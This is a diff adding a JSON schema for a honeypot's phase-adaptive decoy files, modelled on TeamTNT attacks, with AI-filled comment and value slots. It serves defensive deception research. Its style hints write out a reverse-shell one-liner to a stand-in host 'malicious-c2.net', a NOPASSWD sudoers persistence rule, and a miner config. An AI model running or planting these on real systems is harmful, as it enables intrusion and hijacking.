@@ -1,0 +1,384 @@
+{
+  "schema_version": "1",
+  "_purpose": "Part 2 (phase-adaptive decoys, 2026-08-29/30) — เป้าหมายไฟล์ใหม่ที่วางตาม kill_chain_phase ของ session ระหว่างเซสชันดำเนินอยู่ (ต่างจาก vfs_schema_updated_2026-07-22.json ของ Part 1 ที่วางครบทุกไฟล์ตอน login ครั้งเดียว) อ้างอิงสถานการณ์ TeamTNT (G0139, https://attack.mitre.org/groups/G0139/) — ดูเหตุผลเต็มใน jaunty-drifting-tome.md ส่วน 'สถานการณ์อ้างอิง Part 2'",
+  "_created": "2026-08-30",
+  "_decision_rationale": "10 target (11 schema entries รวม backup_exfil/ ที่แตกเป็น dir+manifest คู่กัน) คัดจาก TeamTNT technique + regex gap ใน predict_phase_rules.py ตัด Weaponization/Delivery/Exploitation ออกทั้งหมด (verify แล้วว่า stock command เช็ค fs.exists() เองอยู่แล้ว ไม่ต้องมีไฟล์ดักไว้ล่วงหน้า) — uniqueness='shared' ทุกรายการ (ต่างจาก Part 1 ที่เป็น 'session') เพราะไฟล์กลุ่มนี้คือ 'หลักฐานที่มีอยู่ก่อนแล้วในเครื่อง' (ร่องรอย compromise เดิม/ความลับองค์กร) ไม่ใช่ของเฉพาะ attacker คนปัจจุบัน — ใช้กลไก warm_tier (กลุ่ม A ใน prefetch_worker.py) เดิม ผูกกับ (kill_chain_phase, attacker_type/tier, action) ไม่ผูกกับ session_id",
+  "content_policy_legend": {
+    "static": "โครงไฟล์ + ค่าทั้งหมด deterministic ล้วนๆ ไม่เรียก AI เลย (ใช้กับ syntax เข้มงวดที่สุด เช่น sudoers rule)",
+    "hybrid": "โครงไฟล์ deterministic (Python เป็นคนประกอบ syntax) แต่มี 1-2 จุด (ดู ai_slots) เป็นค่า string สั้นที่ AI แต่ง — AI ไม่เคยถูกขอให้สร้าง syntax/โครงสร้างเอง ลดความเสี่ยง format พังตามบทเรียน Part 1 (validate ค่าที่ AI ตอบก่อน insert เสมอ ถ้าไม่ผ่าน fallback เป็นค่า pool-based แทน)",
+    "dynamic": "AI แต่งเนื้อหาทั้งไฟล์ (ใช้เฉพาะไฟล์ข้อความอิสระ ไม่มี syntax เข้มงวด — ความเสี่ยงต่ำแบบเดียวกับ payroll_export ของ Part 1)"
+  },
+  "ai_slots_note": "แต่ละ slot generate 2 เวอร์ชันไว้ล่วงหน้าเสมอ (content_type='deceive'/'normal') ผ่าน warm_tier() เดิม — โทน 2 เวอร์ชันนี้ **ไม่เขียนซ้ำในไฟล์นี้** ใช้ dict กลางเดิม `_CONTENT_TYPE_HINT_LOCAL` ใน prefetch_worker.py ตรงๆ (ตาม CLAUDE.md §5) ตอน trigger จริงถึงจะเรียก sample_action(get_action_probabilities(attacker_type, phase)) จริงเพื่อรู้ว่า session นี้ได้ action อะไร (lure/deceive/delay) แล้วค่อยหยิบเวอร์ชันที่ตรง (lure/delay ใช้เวอร์ชัน 'normal' เดียวกัน ต่างกันแค่ extra_delay_ms ตอน delay) — ไม่มีจุดไหนเดา/ไม่อิงผล Nash equilibrium จริง",
+  "kill_chain_phase_legend": "ใช้ค่าเดียวกับ SessionPhaseTracker.PHASE_ORDER ใน predict_phase_rules.py — เป็น trigger เดียวที่ทำให้ไฟล์นี้ถูกวางจริง (ดูมติ 29 ส.ค. 'Trigger สร้าง/เปลี่ยน decoy = phase เปลี่ยนเท่านั้น')",
+  "phase_adaptive_targets": [
+    {
+      "path": "/etc/rc.local",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "high",
+      "kill_chain_phase": "Installation",
+      "mitre_technique": "T1037 (Boot or Logon Initialization Scripts) -- masquerading style",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "boot_comment",
+          "purpose": "1 บรรทัดคอมเมนต์พรางตัวเหนือคำสั่งเรียก sysupdate (เช่น '# system update check')",
+          "validate": "ต้องขึ้นต้นด้วย '#', ไม่มีขึ้นบรรทัดใหม่ซ้อน, ยาวไม่เกิน 80 ตัวอักษร",
+          "fallback": "'# routine maintenance check'"
+        },
+        {
+          "slot_name": "fake_service_name",
+          "purpose": "ชื่อ service ปลอมที่ comment อ้างถึง (เช่น 'sysupdate-agent') -- แทรกในคอมเมนต์เดียวกับ boot_comment ไม่ใช่บรรทัดแยก",
+          "validate": "เฉพาะ [A-Za-z0-9-], ยาว 4-30 ตัวอักษร",
+          "fallback": "'sysupdate-agent'"
+        }
+      ],
+      "uniqueness": "shared",
+      "uniqueness_note": "หลักฐานที่มีอยู่ก่อนแล้วในเครื่อง ไม่ผูกกับ attacker คนปัจจุบัน -- ใช้ warm_tier (กลุ่ม A) คีย์ (phase, tier, action)",
+      "style_hint": "shell script มาตรฐานของ /etc/rc.local -- shebang #!/bin/sh -e, comment พราง 1 บรรทัด, เรียก /usr/local/bin/sysupdate แบบ background (&), จบด้วย exit 0",
+      "real_editable": true,
+      "real_editable_note": "attacker แก้ไขได้ผ่าน nano/echo เหมือน Part 1 -- ใช้กลไก fs.mkfile()/update_realfile() เดียวกัน",
+      "identity_fields": [],
+      "owner": "root",
+      "group": "root",
+      "mode": "0755"
+    },
+    {
+      "path": "/usr/local/bin/sysupdate",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "high",
+      "kill_chain_phase": "Installation",
+      "mitre_technique": "T1036 (Masquerading) + T1543 (Create or Modify System Process)",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "log_message",
+          "purpose": "1 บรรทัด log/comment message ข้างในสคริปต์ (เช่น 'Checking for system updates...')",
+          "validate": "ไม่มี shell metacharacter อันตราย ($();|&`), ยาวไม่เกิน 60 ตัวอักษร",
+          "fallback": "'Checking for system updates...'"
+        },
+        {
+          "slot_name": "fake_update_host",
+          "purpose": "hostname ปลอมของ 'update server' ที่ log message อ้างถึง (เช่น 'updates.internal.corp') -- ใช้แค่ในข้อความ ไม่ได้ต่อเน็ตจริง",
+          "validate": "รูปแบบ hostname ([a-z0-9.-]+), ยาว 8-40 ตัวอักษร, ไม่มีช่องว่าง",
+          "fallback": "'updates.internal.corp'"
+        }
+      ],
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือน /etc/rc.local -- warm_tier คีย์เดียวกัน",
+      "style_hint": "shell script สั้นๆ แสร้งเป็น system-update checker แต่ background ยิง miner/backdoor จริง (ไม่ต้องเขียนคำสั่งอันตรายจริง แค่ comment/log ให้ดูสมจริง)",
+      "real_editable": true,
+      "real_editable_note": "เหมือน /etc/rc.local",
+      "identity_fields": [],
+      "owner": "root",
+      "group": "root",
+      "mode": "0755"
+    },
+    {
+      "path": "/etc/sudoers.d/99-sysupdate",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "critical",
+      "kill_chain_phase": "Installation",
+      "mitre_technique": "persistence/priv-esc via sudoers",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "sudoers_comment",
+          "purpose": "1 บรรทัด comment header เท่านั้น (เช่น '# Auto-generated by system-update-manager v2.3.1')",
+          "validate": "ต้องขึ้นต้นด้วย '#' เท่านั้น (บรรทัดกฎ sudoers จริงห้าม AI แตะเด็ดขาด)",
+          "fallback": "'# Managed by sysupdate service'"
+        }
+      ],
+      "ai_slots_note_local": "จงใจไม่เพิ่ม slot ที่ 2 ให้ไฟล์นี้ (ต่างจากไฟล์อื่นที่มี 2 slots) — บรรทัดกฎ sudoers เสี่ยง syntax พังสูงสุดในกลุ่มนี้ ไม่คุ้มความเสี่ยงเพื่อความหลากหลายเพิ่ม (attacker แทบไม่อ่าน syntax ละเอียดของไฟล์นี้อยู่แล้ว บรรทัดกฎเองสำคัญกว่า comment มาก)",
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier",
+      "style_hint": "sudoers ไฟล์มาตรฐาน: comment header 1 บรรทัด ตามด้วยกฎ 'sysadmin ALL=(ALL) NOPASSWD: /usr/local/bin/sysupdate' (บรรทัดกฎเขียนจากโค้ด Python ตรงๆ ไม่ผ่าน AI เลย)",
+      "real_editable": true,
+      "real_editable_note": "เหมือนรายการอื่น -- ต้อง mode 0440 เป๊ะ (visudo convention จริง) ถ้า attacker chmod ผิดค่า ก็ปล่อยตามจริง (ไม่ auto-fix)",
+      "identity_fields": [],
+      "owner": "root",
+      "group": "root",
+      "mode": "0440"
+    },
+    {
+      "path": "/tmp/.rc.sh",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "critical",
+      "kill_chain_phase": "Command_and_Control",
+      "mitre_technique": "T1021.004 (SSH) / reverse shell",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "shell_comment",
+          "purpose": "1 บรรทัดคอมเมนต์พรางตัวเหนือบรรทัด reverse shell (เช่น '# temp fix for network monitoring')",
+          "validate": "ขึ้นต้นด้วย '#', ยาวไม่เกิน 80 ตัวอักษร",
+          "fallback": "'# network diagnostics helper'"
+        },
+        {
+          "slot_name": "callback_port",
+          "purpose": "หมายเลข port ที่ reverse shell เชื่อมกลับ (แทนที่ 4444 ตายตัว) -- เพิ่มความหลากหลายให้ดูเหมือนตั้งค่าเองแต่ละรอบ",
+          "validate": "ตัวเลขล้วน ช่วง 1024-65535",
+          "fallback": "pool [4444, 1337, 8080, 9001, 31337] (ค่านิยมที่พบจริงบ่อยในมัลแวร์ ไม่ใช่สุ่มเลขล้วน)"
+        }
+      ],
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier",
+      "style_hint": "reverse-shell one-liner แบบคลาสสิก: comment พราง 1 บรรทัด + 'bash -i >& /dev/tcp/malicious-c2.net/<callback_port> 0>&1' (โดเมน malicious-c2.net ตายตัว มาจาก regex เดิมใน predict_phase_rules.py ห้าม AI เปลี่ยน) -- attacker แก้ IP/โดเมนเป็นของตัวเองได้ (สัญญาณพฤติกรรมที่ตั้งใจ)",
+      "real_editable": true,
+      "real_editable_note": "เหมือนรายการอื่น -- ถ้า attacker แก้โดเมน/IP เป็นของตัวเอง เป็น finding พฤติกรรมที่น่าสนใจ (territorial hijack)",
+      "identity_fields": [],
+      "owner": "root",
+      "group": "root",
+      "mode": "0755"
+    },
+    {
+      "path": "/var/www/legacy-erp/.env",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "critical",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "regex gap เดิม (.env) -- credential access",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "app_secret",
+          "purpose": "ค่าของ key APP_SECRET (string สุ่มดูสมจริง)",
+          "validate": "ไม่มีช่องว่าง/ขึ้นบรรทัดใหม่, ยาว 16-64 ตัวอักษร, เฉพาะ [A-Za-z0-9]",
+          "fallback": "base64 random 32 bytes (deterministic pool เหมือน authorized_keys ของ Part 1)"
+        },
+        {
+          "slot_name": "mail_password",
+          "purpose": "ค่าของ key MAIL_PASSWORD (secret ตัวที่ 2 ให้ไฟล์ดูมีของจริงมากกว่า 1 secret)",
+          "validate": "ไม่มีช่องว่าง/ขึ้นบรรทัดใหม่, ยาว 8-32 ตัวอักษร, เฉพาะ [A-Za-z0-9!@#]",
+          "fallback": "pool-based (รูปแบบเดียวกับ _gen_masked_bank_account แต่ไม่ mask เต็มรูปแบบ)"
+        }
+      ],
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier",
+      "style_hint": "ไฟล์ .env มาตรฐานของเว็บแอป PHP legacy: DB_HOST/DB_NAME/DB_USER/DB_PASS (deterministic pool ทั้งหมด, ผูกกับ config.php ให้ค่าตรงกัน) + APP_SECRET/MAIL_PASSWORD (AI slots)",
+      "real_editable": true,
+      "real_editable_note": "เหมือนรายการอื่น",
+      "identity_fields": [],
+      "owner": "www-data",
+      "group": "www-data",
+      "mode": "0640"
+    },
+    {
+      "path": "/etc/nas_mount.conf",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "critical",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "regex gap เดิม (nas_mount.conf) -- lateral movement bait",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "share_comment",
+          "purpose": "1 บรรทัด comment อธิบาย share (เช่น '# Q1 2026 financial backup share')",
+          "validate": "ขึ้นต้นด้วย '#', ยาวไม่เกิน 80 ตัวอักษร",
+          "fallback": "'# backup mount point'"
+        },
+        {
+          "slot_name": "share_label",
+          "purpose": "ชื่อ share label ที่ระบุใน config (เช่น 'finance_backup_2026') -- แทนที่ placeholder ตายตัว",
+          "validate": "เฉพาะ [a-z0-9_-], ยาว 4-30 ตัวอักษร",
+          "fallback": "'nas-share-01'"
+        }
+      ],
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier",
+      "style_hint": "config ของ CIFS/NFS mount ไป NAS สำรองข้อมูล: comment + share label (AI slots) + credentials= path ชี้ไปไฟล์ .creds_all.txt (deterministic, ผูก narrative เข้าด้วยกัน) + server IP (deterministic pool ภายใน subnet เดียวกับที่ระบบใช้จริง)",
+      "real_editable": true,
+      "real_editable_note": "เหมือนรายการอื่น",
+      "identity_fields": [],
+      "owner": "root",
+      "group": "root",
+      "mode": "0600"
+    },
+    {
+      "path": "/var/www/legacy-erp/config.php",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "high",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "regex gap เดิม (config.php) -- credential access, ระบบเก่าก่อนย้ายมา Odoo",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "legacy_comment",
+          "purpose": "1 บรรทัดคอมเมนต์อธิบายระบบเก่า (เช่น '// Legacy accounting system -- deprecated, migrating to Odoo Q2 2026')",
+          "validate": "ขึ้นต้นด้วย '//', ยาวไม่เกิน 100 ตัวอักษร",
+          "fallback": "'// Legacy system -- pending decommission'"
+        },
+        {
+          "slot_name": "admin_contact",
+          "purpose": "อีเมลแอดมินที่อ้างถึงใน comment ถัดไป (เช่น '// contact: it-support@<company-domain>') -- ใช้ domain เดียวกับ persona ของระบบ (erp-db-01, ไม่ใช่โดเมนจริงภายนอก)",
+          "validate": "รูปแบบอีเมลพื้นฐาน (มี @ และ .), ยาวไม่เกิน 50 ตัวอักษร",
+          "fallback": "'it-support@erp-db-01.internal'"
+        }
+      ],
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier -- ค่า DB_* ต้องตรงกับ .env (ผูก narrative เดียวกัน อ่านจากไฟล์เดียวกันตอน generate)",
+      "style_hint": "PHP config มาตรฐาน: comment อธิบายระบบ + admin contact (AI slots) + define('DB_HOST', ...) ฯลฯ (deterministic ตรงกับ .env)",
+      "real_editable": true,
+      "real_editable_note": "เหมือนรายการอื่น",
+      "identity_fields": [],
+      "owner": "www-data",
+      "group": "www-data",
+      "mode": "0644"
+    },
+    {
+      "path": "/tmp/backup_exfil",
+      "type": "dir",
+      "department": "Finance/IT",
+      "sensitivity": "critical",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "regex gap เดิม (backup_exfil) -- staged exfil directory",
+      "content_policy": "static",
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier",
+      "note": "ตัว dir เองไม่มีเนื้อหา (สร้างผ่าน fs.mkdir()) -- ไฟล์ข้างในดู manifest.txt (entry ถัดไป)",
+      "real_editable": true,
+      "real_editable_note": "attacker วางไฟล์ของตัวเองเพิ่มในนี้ได้ (ใช้ dir จริงตามธรรมชาติ)",
+      "identity_fields": [],
+      "owner": "root",
+      "group": "root",
+      "mode": "0700"
+    },
+    {
+      "path": "/tmp/backup_exfil/manifest.txt",
+      "type": "file",
+      "department": "Finance/IT",
+      "sensitivity": "critical",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "T1074.001 (Local Data Staging)",
+      "content_policy": "dynamic",
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier -- เนื้อหาข้อความอิสระ ความเสี่ยง format ต่ำ เหมือน payroll_export ของ Part 1 เลยให้ AI แต่งทั้งไฟล์ได้",
+      "style_hint": "รายการไฟล์ที่ 'ถูก staged ไว้แล้ว' รอ exfiltrate ออกไป (ชื่อไฟล์ + ขนาดโดยประมาณ + วันที่ + note สั้นๆ) โทน operational log ไม่ใช่ prose -- อ้างถึงไฟล์ประเภทเดียวกับที่มีจริงในระบบ (payroll export, customer backup, financial statement)",
+      "real_editable": true,
+      "real_editable_note": "เหมือนรายการอื่น",
+      "identity_fields": [],
+      "owner": "root",
+      "group": "root",
+      "mode": "0600"
+    },
+    {
+      "path": "/tmp/.creds_all.txt",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "critical",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "T1074.001 (Local Data Staging) -- harvested credential dump",
+      "content_policy": "dynamic",
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier -- เนื้อหาข้อความอิสระ (username:password ต่อบรรทัด) ความเสี่ยง format ต่ำ",
+      "style_hint": "รายการ credential ที่ถูกเก็บรวบรวมมาจากหลายจุดในเครื่อง แต่ละบรรทัดคือ 1 รายการจริง 3 ส่วนคั่นด้วย ':' คือ (1) ชื่อ host/service จริง (เช่น 192.0.2.20, erp-db-01, backup-srv) (2) username จริงที่ดูสมจริง (เช่น svc_backup, root, admin, nas_sync) (3) password ที่ดูสมจริงแตกต่างกันทุกบรรทัด (ผสมตัวอักษร/ตัวเลข/สัญลักษณ์) -- ห้ามพิมพ์คำว่า 'username'/'password'/'service_or_host' เป็นค่าจริงเด็ดขาด (นั่นคือชื่อ placeholder ไม่ใช่ค่าจริง) ห้ามพิมพ์บรรทัดซ้ำกันเป๊ะ ห้ามขึ้นต้นด้วยชื่อภาษา (เช่น 'ini') ให้พิมพ์ credential 6-10 บรรทัดเท่านั้น (SSH/NAS/DB/legacy-erp ปนกัน สอดคล้องกับไฟล์อื่นในระบบ เช่น nas_mount.conf/.env) ห้าม username/password ตรงกับของจริงในระบบ Odoo เป๊ะ (ให้คล้ายแต่ไม่ซ้ำ) -- คำสั่งเรื่องโทน 'unremarkable/nothing sensitive' (ถ้ามี) หมายถึงแค่ให้เลือก service/host ที่ดูสำคัญน้อยกว่าเท่านั้น (เช่น printer, backup-cron แทน production-db) ไม่ได้แปลว่าเปลี่ยนรูปแบบไฟล์เป็นอย่างอื่น -- ไฟล์นี้ต้องเป็น host:user:pass ต่อบรรทัดเสมอไม่ว่าโทนจะเป็นแบบไหน",
+      "real_editable": true,
+      "real_editable_note": "เหมือนรายการอื่น",
+      "identity_fields": [],
+      "owner": "root",
+      "group": "root",
+      "mode": "0600"
+    },
+    {
+      "path": ".config/xmrig/config.json",
+      "path_note": "relative ต่อ home dir ของ attacker ที่ login จริง (แทนที่ด้วย /home/<username>/.config/xmrig/config.json ตอน placement เหมือนที่ Part 1 แทนที่ /sysadmin/ ด้วย username จริง)",
+      "type": "file",
+      "department": "IT",
+      "sensitivity": "medium",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "T1496.001 (Resource Hijacking: Compute Hijacking) -- miner config",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "wallet_address",
+          "purpose": "ค่า wallet address string (field 'user' ใน pools[0])",
+          "validate": "เฉพาะ [A-Za-z0-9], ยาว 90-98 ตัวอักษร (รูปแบบ Monero address จริง), ไม่มีช่องว่าง",
+          "fallback": "pool ของ wallet address ปลอมที่เตรียมไว้ (deterministic)"
+        },
+        {
+          "slot_name": "worker_name",
+          "purpose": "ป้ายชื่อเครื่อง/worker (field 'worker-id' หรือ comment ใน config) เช่น 'erp-db-01-w1'",
+          "validate": "เฉพาะ [A-Za-z0-9-], ยาว 4-24 ตัวอักษร",
+          "fallback": "'erp-db-01-w1'"
+        }
+      ],
+      "ai_slots_note_local": "ทั้ง 2 slot เป็นแค่ string value ที่ insert เข้า dict Python ก่อน json.dumps() การันตี JSON syntax ถูกเสมอไม่ว่าค่าจะเป็นอะไร (AI ไม่มีทางทำ JSON พัง เพราะไม่เคยแตะ syntax เอง)",
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือนรายการอื่น -- warm_tier",
+      "style_hint": "config มาตรฐานของ XMRig miner (pool url เป็น pool.minexmr.com หรือคล้ายกัน, algo=rx/0) -- ตั้งใจให้ attacker แก้ wallet เป็นของตัวเอง (สัญญาณ territorial hijack ที่น่าสนใจมาก ตามที่คุยไว้)",
+      "real_editable": true,
+      "real_editable_note": "จุดสำคัญที่สุดของไฟล์นี้ -- ถ้า attacker แก้ wallet เป็น territorial-hijack finding โดยตรง ต้อง verify ว่า nano/echo แก้ JSON ไฟล์นี้ได้จริงตอน implement",
+      "identity_fields": [],
+      "owner": "$USERNAME",
+      "group": "$USERNAME",
+      "mode": "0644"
+    },
+    {
+      "table_name": "export_batch_log",
+      "type": "table",
+      "department": "IT",
+      "sensitivity": "critical",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "T1074.001 (Local Data Staging) -- log การเตรียมข้อมูลก่อน exfil (คู่กับ backup_exfil/manifest.txt ที่มีอยู่แล้วใน phase นี้)",
+      "content_policy": "hybrid",
+      "ai_slots": [
+        {
+          "slot_name": "batch_note",
+          "purpose": "1 บรรทัดสั้นๆ note/status ของแถว log (เช่น 'nightly automated export' หรือถ้า deceive ให้ดูเหมือนยืนยันว่าย้ายข้อมูลออกไปนอกเครื่องสำเร็จแล้ว)",
+          "validate": "ยาวไม่เกิน 60 ตัวอักษร ไม่มี shell metacharacter อันตราย ($();|&`)",
+          "fallback": "'automated export batch'"
+        }
+      ],
+      "db_schema": "decoy",
+      "columns": [
+        "batch_id",
+        "source_table",
+        "row_count",
+        "staged_at",
+        "destination_host",
+        "status"
+      ],
+      "uniqueness": "shared",
+      "uniqueness_note": "เหมือน legacy_erp_customers -- warm_phase() 2 เวอร์ชัน, apply จริงตอน placement เท่านั้น",
+      "style_hint": "log อัตโนมัติของ job export/backup ข้อมูลจากตารางอื่นในระบบ (เช่น res_partner, account_move, payroll_export) ก่อนย้ายไปเก็บที่อื่น -- โทน 'normal': destination_host เป็นปลายทางภายใน (เช่น nas-backup.internal.corp), status เป็น 'completed'/'scheduled' ทั่วไป ดูเหมือนงานประจำวันไม่มีอะไรผิดปกติ -- โทน 'deceive': destination_host ใช้ 'malicious-c2.net' (โดเมนเดียวกับที่ /tmp/.rc.sh ใช้อยู่แล้ว -- เรื่องเดียวกัน ไม่สร้างโดเมนใหม่) status เป็น 'completed - verified' บอกเป็นนัยว่ามีคนขโมยข้อมูลออกไปสำเร็จแล้วก่อนหน้านี้",
+      "real_editable": false,
+      "real_editable_note": "เหมือน legacy_erp_customers",
+      "identity_fields": [],
+      "owner": null,
+      "group": null,
+      "mode": null
+    },
+    {
+      "table_name": "legacy_erp_customers",
+      "type": "table",
+      "department": "Finance",
+      "sensitivity": "high",
+      "kill_chain_phase": "Actions_on_Objectives",
+      "mitre_technique": "T1074.001 (Local Data Staging) -- ข้อมูลลูกค้าจากระบบ legacy-erp เดิม (คู่กับ .env/config.php ที่มีอยู่แล้วใน phase นี้ -- โมเดล DB เดียวกับที่ไฟล์ทั้งสองอ้างถึง)",
+      "content_policy": "dynamic",
+      "db_schema": "decoy",
+      "columns": [
+        "customer_name",
+        "tax_id",
+        "contact_email",
+        "phone",
+        "credit_limit",
+        "notes"
+      ],
+      "uniqueness": "shared",
+      "uniqueness_note": "หลักฐานที่มีอยู่ก่อนแล้วในเครื่อง (เหมือนไฟล์อื่นใน phase นี้) ไม่ผูกกับ attacker คนปัจจุบัน -- generate ผ่าน warm_phase() 2 เวอร์ชัน (deceive/normal) เหมือนไฟล์ แต่ apply จริง (CREATE TABLE + INSERT ลง Postgres schema 'decoy') ตอน placement เท่านั้น ไม่ใช่ตอน warm",
+      "style_hint": "ข้อมูลลูกค้าธุรกิจ SME ไทยทั่วไปของระบบบัญชี legacy (ก่อนย้ายมา Odoo) -- โทน 'normal' ให้ดูธรรมดาไม่มีอะไรโดดเด่น โทน 'deceive' ให้มี 1 แถวที่ดูเหมือนบัญชี VIP/internal-test ปะปนอยู่ (credit_limit สูงผิดปกติ + notes แนะเป็นนัยว่าเป็นบัญชีภายใน) เพื่อล่อให้ attacker เสียเวลาไล่ตาม",
+      "real_editable": false,
+      "real_editable_note": "ตาราง DB ไม่มีแนวคิด nano/echo แก้ไข -- attacker แก้ได้ผ่าน UPDATE/INSERT SQL เท่านั้น (psql.py ยังไม่รองรับ DML ต่อตาราง decoy กลุ่มนี้ในรอบนี้ -- SELECT/\\dt/\\d เท่านั้น เหมือนตาราง Part 1)",
+      "identity_fields": [],
+      "owner": null,
+      "group": null,
+      "mode": null
+    }
+  ]
+}
